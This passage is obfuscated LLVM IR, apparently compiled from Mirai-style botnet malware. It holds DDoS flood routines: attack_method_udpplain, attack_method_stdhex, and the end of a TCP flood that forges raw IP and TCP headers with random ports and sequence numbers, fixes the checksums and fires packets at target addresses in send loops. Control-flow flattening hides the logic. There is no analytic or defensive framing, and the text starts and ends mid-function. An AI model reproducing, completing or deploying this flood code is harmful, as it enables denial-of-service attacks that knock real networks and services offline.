  %377 = call i32 @rand_next()
  %378 = and i32 %377, 65535
  %379 = trunc i32 %378 to i16
  %380 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %381 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %380, i32 0, i32 1
  store i16 %379, i16* %381, align 2
  store i32 628125405, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = load i32, i32* %18, align 4
  %384 = icmp eq i32 %383, 65535
  %385 = select i1 %384, i32 1921115109, i32 1582985724
  store i32 %385, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = call i32 @rand_next()
  %388 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 2
  store i32 %387, i32* %389, align 4
  store i32 1582985724, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %19, align 4
  %392 = icmp eq i32 %391, 65535
  %393 = select i1 %392, i32 -309048737, i32 -1729983192
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i32 @rand_next()
  %396 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 3
  store i32 %395, i32* %397, align 4
  store i32 -1729983192, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i8, i8* %20, align 1
  %400 = icmp ne i8 %399, 0
  %401 = select i1 %400, i32 -1528970522, i32 1563720651
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = call i32 @rand_next()
  %404 = and i32 %403, 65535
  %405 = trunc i32 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 7
  store i16 %405, i16* %407, align 2
  store i32 1563720651, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  %409 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 0, i16* %410, align 2
  %411 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %412 = bitcast %struct.iphdr* %411 to i16*
  %413 = call zeroext i16 @checksum_generic(i16* %412, i32 20)
  %414 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  %416 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 6
  store i16 0, i16* %417, align 4
  %418 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %419 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %420 = bitcast %struct.tcphdr* %419 to i8*
  %421 = call zeroext i16 @htons(i16 zeroext 40) #7
  %422 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %418, i8* %420, i16 zeroext %421, i32 40)
  %423 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 6
  store i16 %422, i16* %424, align 4
  %425 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %426 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %425, i32 0, i32 1
  %427 = load i16, i16* %426, align 2
  %428 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %429 = load i32, i32* %9, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %428, i64 %430
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i32 0, i32 0
  %433 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %432, i32 0, i32 1
  store i16 %427, i16* %433, align 2
  %434 = load i32, i32* %10, align 4
  %435 = load i8*, i8** %30, align 8
  %436 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %437 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i64 %439
  %441 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i32 0, i32 0
  %442 = bitcast %struct.sockaddr_in* %441 to %struct.sockaddr*
  store %struct.sockaddr* %442, %struct.sockaddr** %436, align 8
  %443 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %444 = load %struct.sockaddr*, %struct.sockaddr** %443, align 8
  %445 = call i64 @sendto(i32 %434, i8* %435, i64 60, i32 16384, %struct.sockaddr* %444, i32 16)
  store i32 506772235, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  %447 = load i32, i32* %9, align 4
  %448 = add nsw i32 %447, 1
  store i32 %448, i32* %9, align 4
  store i32 1152337798, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  store i32 -1919529451, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %449, %446, %408, %402, %398, %394, %390, %386, %382, %376, %371, %365, %360, %354, %349, %345, %341, %320, %300, %294, %293, %292, %289, %164, %160, %116, %110, %109, %106, %100, %99, %first, %switchDefault
  br label %loopEntry
}

declare zeroext i16 @checksum_generic(i16*, i32) #3

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #3

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 1458)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  store i32 %49, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -943152776, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -943152776, label %first
    i32 1490146656, label %52
    i32 1599333462, label %55
    i32 1488271157, label %58
    i32 1729161063, label %59
    i32 636595470, label %65
    i32 -488631578, label %75
    i32 -1704330598, label %84
    i32 743884255, label %93
    i32 1840137911, label %101
    i32 85182918, label %102
    i32 -1540587849, label %120
    i32 1745392544, label %121
    i32 -308404156, label %131
    i32 1458705809, label %157
    i32 1602301107, label %175
    i32 -730044901, label %176
    i32 1324977812, label %177
    i32 -510155542, label %180
    i32 1810516730, label %181
    i32 744515674, label %182
    i32 1814762390, label %188
    i32 1109441615, label %197
    i32 -1056218918, label %201
    i32 743889965, label %211
    i32 678167930, label %214
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %50 = icmp eq i32 %.reload, 65535
  %51 = select i1 %50, i32 1490146656, i32 1599333462
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = call i32 @rand_next()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %13, align 2
  store i32 1488271157, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i16, i16* %13, align 2
  %57 = call zeroext i16 @htons(i16 zeroext %56) #7
  store i16 %57, i16* %13, align 2
  store i32 1488271157, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1729161063, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %9, align 4
  %61 = load i8, i8* %5, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp slt i32 %60, %62
  %64 = select i1 %63, i32 636595470, i32 -510155542
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %67 = load i8**, i8*** %10, align 8
  %68 = load i32, i32* %9, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8*, i8** %67, i64 %69
  store i8* %66, i8** %70, align 8
  %71 = load i16, i16* %12, align 2
  %72 = zext i16 %71 to i32
  %73 = icmp eq i32 %72, 65535
  %74 = select i1 %73, i32 -488631578, i32 -1704330598
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = call i32 @rand_next()
  %77 = trunc i32 %76 to i16
  %78 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i64 %80
  %82 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %81, i32 0, i32 0
  %83 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %82, i32 0, i32 1
  store i16 %77, i16* %83, align 2
  store i32 743884255, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i16, i16* %12, align 2
  %86 = call zeroext i16 @htons(i16 zeroext %85) #7
  %87 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %88 = load i32, i32* %9, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i64 %89
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %90, i32 0, i32 0
  %92 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %91, i32 0, i32 1
  store i16 %86, i16* %92, align 2
  store i32 743884255, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %95 = load i32*, i32** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i32, i32* %95, i64 %97
  store i32 %94, i32* %98, align 4
  %99 = icmp eq i32 %94, -1
  %100 = select i1 %99, i32 1840137911, i32 85182918
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  ret void

; <label>:102:                                    ; preds = %loopEntry
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %103, align 4
  %104 = load i16, i16* %13, align 2
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %104, i16* %105, align 2
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %107 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %106, i32 0, i32 0
  store i32 0, i32* %107, align 4
  %108 = load i32*, i32** %11, align 8
  %109 = load i32, i32* %9, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i32, i32* %108, i64 %110
  %112 = load i32, i32* %111, align 4
  %113 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %114 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %114, %struct.sockaddr** %113, align 8
  %115 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %116 = load %struct.sockaddr*, %struct.sockaddr** %115, align 8
  %117 = call i32 @bind(i32 %112, %struct.sockaddr* %116, i32 16) #6
  %118 = icmp eq i32 %117, -1
  %119 = select i1 %118, i32 -1540587849, i32 1745392544
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 1745392544, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %122, i64 %124
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %125, i32 0, i32 2
  %127 = load i8, i8* %126, align 4
  %128 = zext i8 %127 to i32
  %129 = icmp slt i32 %128, 32
  %130 = select i1 %129, i32 -308404156, i32 1458705809
  store i32 %130, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %132 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 1
  %137 = load i32, i32* %136, align 4
  %138 = call i32 @ntohl(i32 %137) #7
  %139 = call i32 @rand_next()
  %140 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %141 = load i32, i32* %9, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %140, i64 %142
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %143, i32 0, i32 2
  %145 = load i8, i8* %144, align 4
  %146 = zext i8 %145 to i32
  %147 = lshr i32 %139, %146
  %148 = add i32 %138, %147
  %149 = call i32 @htonl(i32 %148) #7
  %150 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %151 = load i32, i32* %9, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i64 %152
  %154 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %153, i32 0, i32 0
  %155 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %154, i32 0, i32 2
  %156 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %155, i32 0, i32 0
  store i32 %149, i32* %156, align 4
  store i32 1458705809, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i32*, i32** %11, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds i32, i32* %158, i64 %160
  %162 = load i32, i32* %161, align 4
  %163 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 0
  %169 = bitcast %struct.sockaddr_in* %168 to %struct.sockaddr*
  store %struct.sockaddr* %169, %struct.sockaddr** %163, align 8
  %170 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %171 = load %struct.sockaddr*, %struct.sockaddr** %170, align 8
  %172 = call i32 @connect(i32 %162, %struct.sockaddr* %171, i32 16)
  %173 = icmp eq i32 %172, -1
  %174 = select i1 %173, i32 1602301107, i32 -730044901
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 -730044901, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 1324977812, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %9, align 4
  %179 = add nsw i32 %178, 1
  store i32 %179, i32* %9, align 4
  store i32 1729161063, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  store i32 1810516730, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 744515674, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i32, i32* %9, align 4
  %184 = load i8, i8* %5, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp slt i32 %183, %185
  %187 = select i1 %186, i32 1814762390, i32 678167930
  store i32 %187, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i8**, i8*** %10, align 8
  %190 = load i32, i32* %9, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8*, i8** %189, i64 %191
  %193 = load i8*, i8** %192, align 8
  store i8* %193, i8** %22, align 8
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  %196 = select i1 %195, i32 1109441615, i32 -1056218918
  store i32 %196, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i8*, i8** %22, align 8
  %199 = load i16, i16* %14, align 2
  %200 = zext i16 %199 to i32
  call void @rand_str(i8* %198, i32 %200)
  store i32 -1056218918, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i32*, i32** %11, align 8
  %203 = load i32, i32* %9, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds i32, i32* %202, i64 %204
  %206 = load i32, i32* %205, align 4
  %207 = load i8*, i8** %22, align 8
  %208 = load i16, i16* %14, align 2
  %209 = zext i16 %208 to i64
  %210 = call i64 @send(i32 %206, i8* %207, i64 %209, i32 16384)
  store i32 743889965, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %212 = load i32, i32* %9, align 4
  %213 = add nsw i32 %212, 1
  store i32 %213, i32* %9, align 4
  store i32 744515674, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  store i32 1810516730, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %214, %211, %201, %197, %188, %182, %181, %180, %177, %176, %175, %157, %131, %121, %120, %102, %93, %84, %75, %65, %59, %58, %55, %52, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare void @rand_str(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_stdhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca [256 x i8*], align 16
  %20 = alloca i8*, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %23 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %24 = load i8, i8* %5, align 1
  %25 = zext i8 %24 to i64
  %26 = call noalias i8* @calloc(i64 %25, i64 8) #6
  %27 = bitcast i8* %26 to i8**
  store i8** %27, i8*** %10, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 4) #6
  %31 = bitcast i8* %30 to i32*
  store i32* %31, i32** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 7, i32 65535)
  %35 = trunc i32 %34 to i16
  store i16 %35, i16* %12, align 2
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 6, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 0, i32 1458)
  %43 = trunc i32 %42 to i16
  store i16 %43, i16* %14, align 2
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 1, i32 1)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 16, i32 4, i1 false)
  %49 = load i16, i16* %13, align 2
  %50 = zext i16 %49 to i32
  store i32 %50, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1628921955, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1628921955, label %first
    i32 -1399085428, label %53
    i32 -192186360, label %56
    i32 1057602385, label %59
    i32 -76310779, label %60
    i32 1108784874, label %66
    i32 1671859919, label %82
    i32 -842237617, label %91
    i32 -1363092, label %100
    i32 309520689, label %108
    i32 576337693, label %109
    i32 1059403816, label %127
    i32 2090523797, label %128
    i32 987293414, label %138
    i32 511869781, label %164
    i32 -650967486, label %182
    i32 -2013905879, label %183
    i32 -134514549, label %184
    i32 291659073, label %187
    i32 1181979042, label %188
    i32 -1205976444, label %189
    i32 -1615878649, label %195
    i32 -1211562806, label %204
    i32 -930987092, label %208
    i32 2025555077, label %218
    i32 -2045518670, label %221
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %51 = icmp eq i32 %.reload, 65535
  %52 = select i1 %51, i32 -1399085428, i32 -192186360
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = call i32 @rand_next()
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %13, align 2
  store i32 1057602385, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i16, i16* %13, align 2
  %58 = call zeroext i16 @htons(i16 zeroext %57) #7
  store i16 %58, i16* %13, align 2
  store i32 1057602385, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -76310779, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %9, align 4
  %62 = load i8, i8* %5, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp slt i32 %61, %63
  %65 = select i1 %64, i32 1108784874, i32 291659073
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = bitcast [256 x i8*]* %19 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %67, i8* bitcast ([256 x i8*]* @attack_method_stdhex.satuur_thicc to i8*), i64 2048, i32 16, i1 false)
  %68 = call i32 @rand() #6
  %69 = srem i32 %68, 256
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [256 x i8*], [256 x i8*]* %19, i64 0, i64 %70
  %72 = load i8*, i8** %71, align 8
  store i8* %72, i8** %20, align 8
  %73 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %74 = load i8**, i8*** %10, align 8
  %75 = load i32, i32* %9, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8*, i8** %74, i64 %76
  store i8* %73, i8** %77, align 8
  %78 = load i16, i16* %12, align 2
  %79 = zext i16 %78 to i32
  %80 = icmp eq i32 %79, 65535
  %81 = select i1 %80, i32 1671859919, i32 -842237617
  store i32 %81, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = call i32 @rand_next()
  %84 = trunc i32 %83 to i16
  %85 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %86 = load i32, i32* %9, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i64 %87
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %88, i32 0, i32 0
  %90 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %89, i32 0, i32 1
  store i16 %84, i16* %90, align 2
  store i32 -1363092, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i16, i16* %12, align 2
  %93 = call zeroext i16 @htons(i16 zeroext %92) #7
  %94 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %95 = load i32, i32* %9, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %94, i64 %96
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %97, i32 0, i32 0
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %98, i32 0, i32 1
  store i16 %93, i16* %99, align 2
  store i32 -1363092, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %102 = load i32*, i32** %11, align 8
  %103 = load i32, i32* %9, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i32, i32* %102, i64 %104
  store i32 %101, i32* %105, align 4
  %106 = icmp eq i32 %101, -1
  %107 = select i1 %106, i32 309520689, i32 576337693
  store i32 %107, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  ret void

; <label>:109:                                    ; preds = %loopEntry
  %110 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %110, align 4
  %111 = load i16, i16* %13, align 2
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %111, i16* %112, align 2
  %113 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %114 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %113, i32 0, i32 0
  store i32 0, i32* %114, align 4
  %115 = load i32*, i32** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i32, i32* %115, i64 %117
  %119 = load i32, i32* %118, align 4
  %120 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %121 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %121, %struct.sockaddr** %120, align 8
  %122 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
